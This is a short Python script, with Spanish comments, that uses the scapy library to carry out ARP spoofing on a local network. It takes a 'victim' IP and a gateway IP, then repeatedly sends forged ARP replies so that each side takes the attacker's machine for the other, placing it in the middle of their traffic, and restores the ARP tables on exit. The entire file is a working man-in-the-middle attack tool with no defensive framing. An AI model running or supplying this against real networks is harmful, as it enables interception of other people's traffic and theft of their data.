import scapy.all as scapy
import time
import optparse

def getArguments():
    parser = optparse.OptionParser()
    parser.add_option('-a', '--dstip', dest= 'targetIp', help='Direcciòn Ip de la víctima')
    parser.add_option('-b', '--gtwip', dest= 'gatewayIp', help='Gateway del atacante')
    options = parser.parse_args()[0]
    return options

def getMac(ip):
    arpRequest = scapy.ARP(pdst= ip)
    broadcast = scapy.Ether(dst= 'ff:ff:ff:ff:ff:ff')

    #Pregunta a cada dispositivo conectado a la ip por su respectiva ip y éste le responderá con su ip y dirección mac
    arpRequestBroadcast = broadcast/arpRequest
    answeredList = scapy.srp(arpRequestBroadcast, timeout= 1, verbose = False)[0]

    return answeredList[0][1].hwsrc

#Reestablece el ARP de la victima
def restore(destinationIp, sourceIp): 
    destMac = getMac(destinationIp)
    sourceMac = getMac(sourceIp)
    packet = scapy.ARP(op=2, pdst=destinationIp, hwdst=destMac, psrc=sourceIp, hwsrc=sourceMac)
    scapy.send(packet, count=4, verbose=False)
   

def spoof(targetIp, spoofIp):
    '''
    Enviaremos un paquete ARP a la victima haciendole creer que nuestra maquina es el router
    En los parametros 'pdst' y 'hwdst' ingresaremos la ip y mac del dispositivo al que queremos atacar
    En 'psrc' ingresaremos la direcciòn de nustro puerto (Gateway): sudo route -n
    '''
    targetMac = getMac(targetIp)
    packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=spoofIp)
    scapy.send(packet, verbose=False)

sentPackets = 0
ips = getArguments()
try:
    while True:
        spoof(ips.targetIp, ips.gatewayIp) #Le decimos al dispositivo atacado que somos el router
        spoof(ips.gatewayIp, ips.targetIp) #Le decimos al router que somos el dispositivo atacado
        time.sleep(2)

except KeyboardInterrupt: 
    print('\nFializando ejecución...Limpiando tablas ARP...')
    restore(ips.targetIp, ips.gatewayIp)
    print('Programa finalizado')